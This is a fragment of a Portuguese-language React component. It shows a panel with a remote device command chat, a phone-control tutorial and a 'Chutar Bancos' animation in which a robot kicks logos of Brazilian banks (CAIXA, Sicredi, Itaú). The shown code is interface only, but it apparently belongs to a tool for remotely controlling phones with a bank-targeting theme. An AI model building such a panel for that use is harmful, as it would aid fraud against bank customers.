                    type="button"
                    onClick={cycleDockPosition}
                    className="p-1.5 rounded-xl bg-slate-900/80 border border-red-500/30 text-slate-400 hover:text-pink-300 hover:border-red-400 transition-all hover:scale-105 active:scale-95"
                    title={`Mover Janela (${dockPosition})`}
                  >
                    <Move className="w-3.5 h-3.5" />
                  </button>

                  <button
                    type="button"
                    onClick={() => setIsMinimized(true)}
                    className="p-1.5 rounded-xl bg-slate-900/80 border border-red-500/30 text-slate-400 hover:text-pink-300 hover:border-red-400 transition-all hover:scale-105 active:scale-95"
                    title="Minimizar para Barra Flutuante"
                  >
                    <Minus className="w-3.5 h-3.5" />
                  </button>

                  <button
                    type="button"
                    onClick={() => setIsOpen(false)}
                    className="p-1.5 rounded-xl bg-slate-900/80 border border-red-500/30 text-slate-400 hover:text-pink-300 hover:border-red-400 transition-all hover:scale-105 active:scale-95"
                    title="Fechar Janela"
                  >
                    <X className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>

              {/* ðŸ“‘ SELETOR DE ABAS PRINCIPAIS */}
              <div className="flex items-center gap-1.5 mt-2.5 p-1 rounded-xl bg-slate-950/80 border border-red-500/30 relative z-10 flex-shrink-0 select-none">
                <button
                  type="button"
                  onClick={() => setActiveTab('chat')}
                  className={`flex-1 py-1.5 rounded-lg text-[11px] font-mono font-bold transition-all flex items-center justify-center gap-1.5 ${
                    activeTab === 'chat'
                      ? 'bg-gradient-to-r from-red-500 to-red-600 text-white font-black shadow-[0_0_15px_rgba(0,240,255,0.6)]'
                      : 'text-pink-300/70 hover:text-pink-200 hover:bg-red-500/10'
                  }`}
                >
                  <MessageSquare className="w-3.5 h-3.5" />
                  <span>Chat Comandos</span>
                  <span className="w-1.5 h-1.5 rounded-full bg-pink-300 animate-ping" />
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setActiveTab('tutorial');
                    setActiveCategory(initialCategory);
                  }}
                  className={`flex-1 py-1.5 rounded-lg text-[11px] font-mono font-bold transition-all flex items-center justify-center gap-1 ${
                    activeTab === 'tutorial'
                      ? 'bg-gradient-to-r from-red-500 to-red-600 text-white font-black shadow-[0_0_12px_rgba(0,240,255,0.5)]'
                      : 'text-pink-300/70 hover:text-pink-200 hover:bg-red-500/10'
                  }`}
                >
                  <Layers className="w-3 h-3" />
                  <span>Tutorial & Guia</span>
                </button>

                <button
                  type="button"
                  onClick={() => setActiveTab('kick_arena')}
                  className={`flex-1 py-1.5 rounded-lg text-[11px] font-mono font-bold transition-all flex items-center justify-center gap-1 ${
                    activeTab === 'kick_arena'
                      ? 'bg-gradient-to-r from-red-500 to-red-600 text-white font-black shadow-[0_0_12px_rgba(0,240,255,0.5)]'
                      : 'text-pink-300/70 hover:text-pink-200 hover:bg-red-500/10'
                  }`}
                >
                  <Flame className="w-3 h-3" />
                  <span>Chutar Bancos</span>
                </button>
              </div>

              {/* ðŸ“¦ CONTEÃšDO DA ABA ATIVA */}
              <div className="flex-1 overflow-y-auto pr-1 my-2 relative z-10 custom-scrollbar flex flex-col">
                {activeTab === 'chat' ? (
                  <RobotChatCommandExecutor
                    deviceId={deviceId}
                    deviceName={deviceName}
                    devicesList={devicesList}
                    onSendCommand={onSendCommand}
                    installedApps={installedApps}
                  />
                ) : activeTab === 'kick_arena' ? (
                  <div className="py-1">
                    <RobotKickShowcase userName={deviceName || 'operador'} />
                  </div>
                ) : (
                  /* Tutorial */
                  <div className="py-1 select-none">
                    <div className="flex items-center gap-1.5 mb-2 p-1 rounded-lg bg-red-950/40 border border-red-500/20">
                      <button
                        type="button"
                        onClick={() => {
                          setActiveCategory('dashboard');
                          setCurrentStep(0);
                        }}
                        className={`flex-1 py-1 text-[10px] font-mono font-bold rounded ${
                          activeCategory === 'dashboard' ? 'bg-red-500/30 text-pink-200 border border-red-400/50' : 'text-slate-400'
                        }`}
                      >
                        Painel Geral
                      </button>
                      <button
                        type="button"
                        onClick={() => {
                          setActiveCategory('device_control');
                          setCurrentStep(0);
                        }}
                        className={`flex-1 py-1 text-[10px] font-mono font-bold rounded ${
                          activeCategory === 'device_control' ? 'bg-red-500/30 text-pink-200 border border-red-400/50' : 'text-slate-400'
                        }`}
                      >
                        Controle do Celular
                      </button>
                    </div>

                    <div className="flex items-center gap-2 mb-2">
                      <div className="p-1.5 rounded-lg bg-red-500/20 border border-red-400/50">
                        {activeData.icon}
                      </div>
                      <h4 className="text-sm font-black text-white font-mono tracking-wide">
                        {activeData.title}
                      </h4>
                    </div>

                    <p className="text-xs text-red-100/90 leading-relaxed font-sans mt-1">
                      {activeData.content.split('**').map((part, i) =>
                        i % 2 === 1 ? (
                          <strong key={i} className="text-pink-300 font-bold drop-shadow-[0_0_6px_rgba(0,240,255,0.4)]">
                            {part}
                          </strong>
                        ) : (
                          part
                        )
                      )}
                    </p>

                    {activeData.tip && (
                      <div className="mt-3 p-2.5 rounded-xl bg-[#040e24]/90 border border-red-500/30 flex items-start gap-2 text-[11px] text-pink-200/80 font-mono shadow-inner">
                        <Sparkles className="w-3.5 h-3.5 text-red-400 flex-shrink-0 mt-0.5" />
                        <span>{activeData.tip}</span>
                      </div>
                    )}

                    <div className="mt-2.5 px-2.5 py-1.5 rounded-xl bg-red-950/40 border border-red-500/20 flex items-center justify-between text-[10px] font-mono text-pink-300/80">
                      <span className="flex items-center gap-1.5">
                        <Eye className="w-3 h-3 text-red-400 animate-pulse" />
                        FunÃ§Ã£o demonstrada
                      </span>
                      <span className="text-[9px] text-red-400 font-black">
                        {activeData.highlightLabel?.replace('ðŸ‘‰ ', '')}
                      </span>
                    </div>

                    {/* Progress dots */}
                    <div className="flex items-center justify-between gap-1.5 mt-3">
                      {currentStepsList.map((_, idx) => (
                        <button
                          key={idx}
                          type="button"
                          onClick={() => setCurrentStep(idx)}
                          className={`h-1.5 flex-1 rounded-full transition-all duration-300 ${
                            idx === currentStep
                              ? 'bg-gradient-to-r from-red-400 to-pink-300 shadow-[0_0_10px_#ff1e4d]'
                              : idx < currentStep
                              ? 'bg-red-600/60'
                              : 'bg-slate-800'
                          }`}
                          title={`Ir para Passo ${idx + 1}`}
                        />
                      ))}
                    </div>

                    {/* Footer Nav */}
                    <div className="flex items-center justify-between gap-3 pt-3 mt-2 border-t border-red-500/25">
                      <button
                        type="button"
                        onClick={handlePrev}
                        disabled={currentStep === 0}
                        className="px-3.5 py-1.5 rounded-xl border border-red-500/30 text-xs font-mono font-bold text-pink-300 hover:border-red-400 hover:bg-red-500/10 disabled:opacity-30 transition-all flex items-center gap-1"
                      >
                        <ChevronLeft className="w-3.5 h-3.5" />
                        <span>Anterior</span>
                      </button>

                      <div className="text-[10px] font-mono text-red-400/80 font-bold">
                        {currentStep + 1} / {currentStepsList.length}
                      </div>

                      <button
                        type="button"
                        onClick={handleNext}
                        className="px-4 py-1.5 rounded-xl bg-gradient-to-r from-red-500 to-red-600 hover:from-red-400 hover:to-red-500 text-white text-xs font-mono font-black shadow-[0_0_15px_rgba(0,240,255,0.4)] transition-all flex items-center gap-1 hover:scale-105 active:scale-95"
                      >
                        <span>{currentStep === currentStepsList.length - 1 ? 'Concluir' : 'PrÃ³ximo'}</span>
                        {currentStep === currentStepsList.length - 1 ? (
                          <CheckCircle className="w-3.5 h-3.5" />
                        ) : (
                          <ChevronRight className="w-3.5 h-3.5" />
                        )}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )
      )}
    </>
  );
}

/* ==========================================================================
   ðŸ¤– MASCOTE ROBÃ” CIBERNÃ‰TICO (CORPO INTEIRO + PERNA DE CHUTE + PROPULSOR + PISADA)
   ========================================================================== */
export const FullBodyKickingRobot: React.FC<{ 
  size?: number; 
  className?: string;
  kickPhase?: 'idle' | 'charging' | 'impact' | 'flying' | 'wall_hit' | 'returning';
}> = ({
  size = 72,
  className = '',
  kickPhase = 'idle',
}) => {
  const cyanGlow = '#ff1e4d';
  const midBlue = '#cc1e4d';
  const isKickingImpact = kickPhase === 'impact';

  return (
    <div
      className={`relative flex items-center justify-center select-none ${
        kickPhase === 'idle' || kickPhase === 'returning' ? 'animate-robot-idle-alive' : ''
      } ${className}`}
      style={{ width: size, height: size * 1.15 }}
    >
      <div 
        className="absolute inset-0 rounded-full blur-md animate-pulse pointer-events-none"
        style={{
          background: 'radial-gradient(circle, rgba(0,240,255,0.45) 0%, rgba(2,132,199,0.18) 70%, transparent 100%)'
        }}
      />

      <svg
        viewBox="0 0 110 120"
        className="w-full h-full relative z-10 overflow-visible"
        style={{ 
          filter: `drop-shadow(0 0 8px ${cyanGlow})`,
          transform: 
            kickPhase === 'charging' 
              ? 'translateX(-3px) rotate(-4deg)' 
              : isKickingImpact 
              ? 'translateX(4px) rotate(4deg)' 
              : 'translateX(0px) rotate(0deg)',
          transition: isKickingImpact ? 'transform 0.08s cubic-bezier(0.1, 0.9, 0.2, 1)' : 'transform 0.3s ease-out'
        }}
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        <defs>
          <linearGradient id="cyberRobotBody" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stopColor="#991b1b" />
            <stop offset="50%" stopColor="#0f172a" />
            <stop offset="100%" stopColor="#020617" />
          </linearGradient>
          <linearGradient id="cyberRobotVisor" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stopColor="#021430" />
            <stop offset="100%" stopColor="#010814" />
          </linearGradient>
        </defs>

        <line x1="42" y1="20" x2="34" y2="6" stroke={cyanGlow} strokeWidth="2" strokeLinecap="round" />
        <circle cx="34" cy="6" r="3" fill={cyanGlow} className="animate-pulse" />

        <line x1="68" y1="20" x2="76" y2="6" stroke={cyanGlow} strokeWidth="2" strokeLinecap="round" />
        <circle cx="76" cy="6" r="3" fill={cyanGlow} className="animate-pulse" />

        <rect x="30" y="18" width="50" height="42" rx="14" fill="url(#cyberRobotBody)" stroke={cyanGlow} strokeWidth="1.8" />
        <rect x="25" y="32" width="5" height="14" rx="2" fill={midBlue} stroke={cyanGlow} strokeWidth="1" />
        <rect x="80" y="32" width="5" height="14" rx="2" fill={midBlue} stroke={cyanGlow} strokeWidth="1" />

        <rect x="35" y="24" width="40" height="28" rx="8" fill="url(#cyberRobotVisor)" stroke="#ff3b6b" strokeWidth="1.2" />

        <g className="animate-robot-blink">
          <rect x="41" y="32" width="10" height="11" rx="3.5" fill={cyanGlow} />
          <circle cx="44" cy="35" r="1.2" fill="#ffffff" />
          <rect x="59" y="32" width="10" height="11" rx="3.5" fill={cyanGlow} />
          <circle cx="62" cy="35" r="1.2" fill="#ffffff" />
        </g>
        <path d="M49 46 Q55 50 61 46" stroke={cyanGlow} strokeWidth="1.5" strokeLinecap="round" />

        <rect x="49" y="60" width="12" height="5" rx="1.5" fill="#1e293b" stroke={cyanGlow} strokeWidth="1" />
        <rect x="36" y="64" width="38" height="28" rx="8" fill="url(#cyberRobotBody)" stroke={cyanGlow} strokeWidth="1.8" />
        <circle cx="55" cy="76" r="6" fill="#021430" stroke={cyanGlow} strokeWidth="1.2" />
        <circle cx="55" cy="76" r="3.5" fill={cyanGlow} className="animate-pulse" />

        <g style={{ 
          transformOrigin: '36px 68px',
          transform: isKickingImpact ? 'rotate(18deg)' : kickPhase === 'charging' ? 'rotate(-12deg)' : 'rotate(0deg)',
          transition: 'transform 0.2s ease-out'
        }}>
          <path d="M36 68 L22 76 L24 86" stroke={cyanGlow} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          <circle cx="24" cy="86" r="3.5" fill={midBlue} stroke={cyanGlow} strokeWidth="1" />
        </g>

        <g style={{ 
          transformOrigin: '74px 68px',
          transform: isKickingImpact ? 'rotate(-22deg)' : kickPhase === 'charging' ? 'rotate(15deg)' : 'rotate(0deg)',
          transition: 'transform 0.2s ease-out'
        }}>
          <path d="M74 68 L88 74 L86 84" stroke={cyanGlow} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          <circle cx="86" cy="84" r="3.5" fill={midBlue} stroke={cyanGlow} strokeWidth="1" />
        </g>

        <rect x="42" y="92" width="7" height="16" rx="3.5" fill="#0f172a" stroke={cyanGlow} strokeWidth="1.5" />
        <path d="M36 108 L52 108 L52 112 L36 112 Z" fill={midBlue} stroke={cyanGlow} strokeWidth="1.2" />

        <g 
          style={{ 
            transformOrigin: '58px 92px',
            transform: 
              kickPhase === 'charging' 
                ? 'rotate(-28deg)' 
                : isKickingImpact 
                ? 'rotate(65deg)' 
                : kickPhase === 'flying'
                ? 'rotate(-6deg)' 
                : 'rotate(0deg)',
            transition: 
              isKickingImpact 
                ? 'transform 0.08s cubic-bezier(0.1, 0.9, 0.2, 1)' 
                : kickPhase === 'charging'
                ? 'transform 0.35s ease-out'
                : 'transform 0.22s cubic-bezier(0.2, 0.9, 0.3, 1)'
          }}
        >
          <rect x="58" y="92" width="8" height="15" rx="4" fill="#0f172a" stroke={cyanGlow} strokeWidth="1.5" />
          <circle cx="62" cy="107" r="3.5" fill="#ffffff" stroke={cyanGlow} strokeWidth="1" />
          <path d="M58 107 L58 118 L76 118 L76 113 L66 107 Z" fill={midBlue} stroke={cyanGlow} strokeWidth="1.8" />
          
          {isKickingImpact && (
            <>
              <path d="M76 112 L96 116 L76 120 Z" fill={cyanGlow} className="animate-pulse" />
              <path d="M76 114 L88 116 L76 118 Z" fill="#ffffff" />
            </>
          )}
        </g>
      </svg>
    </div>
  );
};

/* ==========================================================================
   ðŸ¥‹ MINI ARENA DO ROBÃ” PARA A BARRA LATERAL (SIDEBAR)
   ========================================================================== */
export const SidebarRobotKick: React.FC = () => {
  const [logoIndex, setLogoIndex] = useState<number>(0);
  const [kickPhase, setKickPhase] = useState<'idle' | 'charging' | 'impact' | 'flying' | 'wall_hit' | 'returning'>('idle');

  const BANK_CARDS = [
    { id: 'caixa', name: 'CAIXA', Card: CaixaLogoCard },
    { id: 'caixa_tem', name: 'CAIXA Tem', Card: CaixaTemLogoCard },
    { id: 'sicredi', name: 'Sicredi', Card: SicrediLogoCard },
    { id: 'itau', name: 'ItaÃº', Card: ItauLogoCard },
  ];

  useEffect(() => {
    let active = true;
    let timerId: any = null;

    const runCycle = () => {
      if (!active) return;
      setKickPhase('charging');

      timerId = setTimeout(() => {
        if (!active) return;
        setKickPhase('impact');

        timerId = setTimeout(() => {
          if (!active) return;
          setKickPhase('flying');

          timerId = setTimeout(() => {
            if (!active) return;
            setKickPhase('wall_hit');

            timerId = setTimeout(() => {
              if (!active) return;
              setKickPhase('returning');
              setLogoIndex((prev) => (prev + 1) % BANK_CARDS.length);

              timerId = setTimeout(() => {
                if (!active) return;
                setKickPhase('idle');
                timerId = setTimeout(runCycle, 800);
              }, 250);
            }, 250);
          }, 520);
        }, 130);
      }, 350);
    };

    const initialTimer = setTimeout(runCycle, 500);

    return () => {
      active = false;
      clearTimeout(initialTimer);
      clearTimeout(timerId);
    };
  }, []);

  return (
    <div className="w-full my-3 px-1 select-none">
      <div className={`relative w-full h-[120px] rounded-2xl bg-gradient-to-r from-[#030b1c]/95 via-[#061638]/90 to-[#020817]/95 border border-red-500/35 p-2 overflow-hidden flex items-center justify-between shadow-[0_0_25px_rgba(0,240,255,0.2)] ${kickPhase === 'impact' ? 'animate-arena-jolt' : ''}`}>
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#ff1e4d07_1px,transparent_1px),linear-gradient(to_bottom,#ff1e4d07_1px,transparent_1px)] bg-[size:8px_8px] pointer-events-none" />

        <div className="relative z-10 flex-shrink-0 flex items-center justify-center pl-0.5">
          <FullBodyKickingRobot size={58} kickPhase={kickPhase} />
        </div>

        <div className="relative z-10 flex-1 ml-1.5 h-[98px] rounded-xl border border-dashed border-red-400/45 bg-[#02091d]/85 p-1.5 flex flex-col justify-between overflow-hidden shadow-inner">
          <div className="flex items-center justify-end pr-1 pt-0.5">
            <span className="text-[9px] font-black font-mono tracking-widest text-pink-300 uppercase flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-ping" />
              NA FILA
            </span>
          </div>

          <div className="relative flex-1 flex items-center justify-center -mt-1">
            <div 
              className={`absolute pointer-events-none transition-all duration-300 ${
                kickPhase === 'impact' || kickPhase === 'flying' || kickPhase === 'wall_hit'
                  ? 'translate-x-0 translate-y-0 scale-100 opacity-100' 
                  : 'translate-x-3.5 -translate-y-0.5 scale-85 opacity-65'
              }`}
              style={{ zIndex: 2 }}
            >
              {React.createElement(BANK_CARDS[(logoIndex + 1) % BANK_CARDS.length].Card, { size: 40 })}
            </div>

            <div 
              className={`absolute pointer-events-none transition-all duration-200 ${
                kickPhase === 'impact' || kickPhase === 'flying' || kickPhase === 'wall_hit'
                  ? 'opacity-0 scale-90 translate-x-3' 
                  : 'opacity-100 scale-100 translate-x-0'
              }`}
              style={{ zIndex: 3 }}
            >
              {React.createElement(BANK_CARDS[logoIndex].Card, { size: 42 })}
            </div>
          </div>
        </div>

        <div className="absolute bottom-1.5 left-3 right-3 h-[1.5px] bg-gradient-to-r from-transparent via-red-400/80 to-transparent shadow-[0_0_8px_#ff1e4d]" />
      </div>
    </div>
  );
};




